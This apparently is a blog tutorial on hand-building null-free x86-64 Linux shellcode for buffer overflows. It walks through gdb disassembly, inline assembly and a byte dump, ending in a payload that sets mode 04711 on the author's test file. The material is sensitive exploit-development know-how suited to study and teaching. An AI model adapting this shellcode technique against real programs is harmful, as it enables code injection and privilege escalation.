---
layout: post
ads: true
comments: true
published: true
title: How to generate shellcode payload
categories:
  - linux
  - program
tags:
  - shellcode
  - bufferoverflow
---
#### Ref
- [Buffer Overflows and You](https://turkeyland.net/projects/overflow/shell.php)

##### Input/output:
- Input

```c
/*
File: mychmod.c
*/

#include <sys/stat.h>

int main() {
  chmod("/home/dvn0zz/ccppsamples/bufferOverflow/test.txt", 04711);
}
```

- Output:
```c
char payload[] =
  "\x48\xbe\xc9\x19\x11\x11\x11\x11\x11\x11\x48\xc1\xe6\x34\x48\xc1\xee\x34\x48"
  "\x31\xff\x57\x48\xbf\x74\x65\x73\x74\x2e\x74\x78\x74\x57\x48\xbf\x76\x65\x72"
  "\x66\x6c\x6f\x77\x2f\x57\x48\xbf\x2f\x62\x75\x66\x66\x65\x72\x4f\x57\x48\xbf"
  "\x70\x73\x61\x6d\x70\x6c\x65\x73\x57\x48\xbf\x6e\x30\x7a\x7a\x2f\x63\x63\x70"
  "\x57\x48\xbf\x2f\x68\x6f\x6d\x65\x2f\x64\x76\x57\x48\x89\xe7\x48\xb8\x5a\x11"
  "\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05";
```

##### Steps
**Step1**: Get input info

```bash
$ gcc -o mychmod mychmod.c
$ gdb mychmod
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004009ae <+0>:     push   %rbp
   0x00000000004009af <+1>:     mov    %rsp,%rbp
   0x00000000004009b2 <+4>:     mov    $0x9c9,%esi
   0x00000000004009b7 <+9>:     mov    $0x4a0ee8,%edi
   0x00000000004009bc <+14>:    callq  0x43f120 <chmod>
   0x00000000004009c1 <+19>:    mov    $0x0,%eax
   0x00000000004009c6 <+24>:    pop    %rbp
   0x00000000004009c7 <+25>:    retq
End of assembler dump.

(gdb) disassemble chmod
Dump of assembler code for function chmod:
   0x000000000043f120 <+0>:     mov    $0x5a,%eax
   0x000000000043f125 <+5>:     syscall
   0x000000000043f127 <+7>:     cmp    $0xfffffffffffff001,%rax
   0x000000000043f12d <+13>:    jae    0x444170 <__syscall_error>
   0x000000000043f133 <+19>:    retq
End of assembler dump.
```

Here we get:
- EAX (RAX) register loaded with system call number for chmod (0x5a)
- EDI (RDI) register loaded with address of first argument, which is filepath string ($0x4a0ee8)
- ESI (RSI) register loaded with second argument has octal value of 04711 (0x9c9)

**Step2**: Mimic assembly code

To mimic setting EAX, ESI value is simple, but to set value for EDI we need put our file path string somewhere and then set address to EDI. Here we will do that by push string on stack then store RSP into EDI. Before we do that, we need convert string to hex represent and also if machine is little-endian (it is in my case) we need to change bytes order also. We will use python3 to do this task.

```bash
$ python3
>>> filepath = "/home/dvn0zz/ccppsamples/bufferOverflow/test.txt"
>>> filepath_byte_arr = bytearray(filepath.encode("ascii"))
>>> filepath_byte_arr.hex()
'2f686f6d652f64766e307a7a2f6363707073616d706c65732f6275666665724f766572666c6f772f746573742e747874'
>>> filepath_byte_arr.reverse()
>>> filepath_byte_arr.hex()
'7478742e747365742f776f6c667265764f7265666675622f73656c706d6173707063632f7a7a306e76642f656d6f682f'
```

Now we can set value for EDI (RDI) like this:

```c
"xor    %rdi,%rdi\n\t"
"push   %rdi\n\t"

"mov    $0x7478742e74736574,%rdi\n\t"
"push   %rdi\n\t"
"mov    $0x2f776f6c66726576,%rdi\n\t"
"push   %rdi\n\t"
"mov    $0x4f7265666675622f,%rdi\n\t"
"push   %rdi\n\t"
"mov    $0x73656c706d617370,%rdi\n\t"
"push   %rdi\n\t"
"mov    $0x7063632f7a7a306e,%rdi\n\t"
"push   %rdi\n\t"
"mov    $0x76642f656d6f682f,%rdi\n\t"
"push   %rdi\n\t"
"mov    %rsp,%rdi\n\t"
```

**Note**: why we need first two instruction? That is because the string need be null terminated

With this we have full mimic assembly code as below:

```c
/*
File: mychmod_asm.c
*/
int main() {
  __asm__("mov    $0x11111111111119c9,%rsi\n\t"
          "shl    $0x34,%rsi\n\t"
          "shr    $0x34,%rsi\n\t" // set RSI to 0x9c9

          "xor    %rdi,%rdi\n\t"
          "push   %rdi\n\t"

          "mov    $0x7478742e74736574,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    $0x2f776f6c66726576,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    $0x4f7265666675622f,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    $0x73656c706d617370,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    $0x7063632f7a7a306e,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    $0x76642f656d6f682f,%rdi\n\t"
          "push   %rdi\n\t"
          "mov    %rsp,%rdi\n\t" // set RDI to address of filepath string

          "mov    $0x111111111111115a,%rax\n\t"
          "shl    $0x38,%rax\n\t"
          "shr    $0x38,%rax\n\t" // set RAX to syscall number of chmod
          "syscall\n\t"

          "add    $0x38,%rsp" // pop out what are put on stack)
  );
}
```

**Note**: why when setting value for RSI/RAX we need three instruction like above? That is we dont want it to have 00 in our output payload (which is null terminated). So the trick here is, for example to set value of 0x9c9 into RSI, we set all 0 bits to 1, left shift RSI to clear those bits, then right shift RSI to get actual value.

**Step3**: Get shellcode payload

```bash
$ gcc -o mychmod_asm mychmod_asm.c
$ gdb mychmod_asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004004d6 <+0>:     push   %rbp
   0x00000000004004d7 <+1>:     mov    %rsp,%rbp
   0x00000000004004da <+4>:     movabs $0x11111111111119c9,%rsi
   0x00000000004004e4 <+14>:    shl    $0x34,%rsi
   0x00000000004004e8 <+18>:    shr    $0x34,%rsi
   0x00000000004004ec <+22>:    xor    %rdi,%rdi
   0x00000000004004ef <+25>:    push   %rdi
   0x00000000004004f0 <+26>:    movabs $0x7478742e74736574,%rdi
   0x00000000004004fa <+36>:    push   %rdi
   0x00000000004004fb <+37>:    movabs $0x2f776f6c66726576,%rdi
   0x0000000000400505 <+47>:    push   %rdi
   0x0000000000400506 <+48>:    movabs $0x4f7265666675622f,%rdi
   0x0000000000400510 <+58>:    push   %rdi
   0x0000000000400511 <+59>:    movabs $0x73656c706d617370,%rdi
   0x000000000040051b <+69>:    push   %rdi
   0x000000000040051c <+70>:    movabs $0x7063632f7a7a306e,%rdi
   0x0000000000400526 <+80>:    push   %rdi
   0x0000000000400527 <+81>:    movabs $0x76642f656d6f682f,%rdi
   0x0000000000400531 <+91>:    push   %rdi
   0x0000000000400532 <+92>:    mov    %rsp,%rdi
   0x0000000000400535 <+95>:    movabs $0x111111111111115a,%rax
   0x000000000040053f <+105>:   shl    $0x38,%rax
   0x0000000000400543 <+109>:   shr    $0x38,%rax
   0x0000000000400547 <+113>:   syscall
   0x0000000000400549 <+115>:   add    $0x38,%rsp
   0x000000000040054d <+119>:   mov    $0x0,%eax
   0x0000000000400552 <+124>:   pop    %rbp
   0x0000000000400553 <+125>:   retq
End of assembler dump.
(gdb) p (0x0000000000400549 - 0x00000000004004da)
$1 = 111
(gdb) x/111bx 0x00000000004004da
0x4004da <main+4>:      0x48    0xbe    0xc9    0x19    0x11    0x11    0x11    0x11
0x4004e2 <main+12>:     0x11    0x11    0x48    0xc1    0xe6    0x34    0x48    0xc1
0x4004ea <main+20>:     0xee    0x34    0x48    0x31    0xff    0x57    0x48    0xbf
0x4004f2 <main+28>:     0x74    0x65    0x73    0x74    0x2e    0x74    0x78    0x74
0x4004fa <main+36>:     0x57    0x48    0xbf    0x76    0x65    0x72    0x66    0x6c
0x400502 <main+44>:     0x6f    0x77    0x2f    0x57    0x48    0xbf    0x2f    0x62
0x40050a <main+52>:     0x75    0x66    0x66    0x65    0x72    0x4f    0x57    0x48
0x400512 <main+60>:     0xbf    0x70    0x73    0x61    0x6d    0x70    0x6c    0x65
0x40051a <main+68>:     0x73    0x57    0x48    0xbf    0x6e    0x30    0x7a    0x7a
0x400522 <main+76>:     0x2f    0x63    0x63    0x70    0x57    0x48    0xbf    0x2f
0x40052a <main+84>:     0x68    0x6f    0x6d    0x65    0x2f    0x64    0x76    0x57
0x400532 <main+92>:     0x48    0x89    0xe7    0x48    0xb8    0x5a    0x11    0x11
0x40053a <main+100>:    0x11    0x11    0x11    0x11    0x11    0x48    0xc1    0xe0
0x400542 <main+108>:    0x38    0x48    0xc1    0xe8    0x38    0x0f    0x05
(gdb)
```

Here we only need payload for instruction from <main+4> to <main+115>. Now we can copy above output into a text editor to remove extra part and get output payload as below:

```c
char payload[] =
  "\x48\xbe\xc9\x19\x11\x11\x11\x11\x11\x11\x48\xc1\xe6\x34\x48\xc1\xee\x34\x48"
  "\x31\xff\x57\x48\xbf\x74\x65\x73\x74\x2e\x74\x78\x74\x57\x48\xbf\x76\x65\x72"
  "\x66\x6c\x6f\x77\x2f\x57\x48\xbf\x2f\x62\x75\x66\x66\x65\x72\x4f\x57\x48\xbf"
  "\x70\x73\x61\x6d\x70\x6c\x65\x73\x57\x48\xbf\x6e\x30\x7a\x7a\x2f\x63\x63\x70"
  "\x57\x48\xbf\x2f\x68\x6f\x6d\x65\x2f\x64\x76\x57\x48\x89\xe7\x48\xb8\x5a\x11"
  "\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05";
```
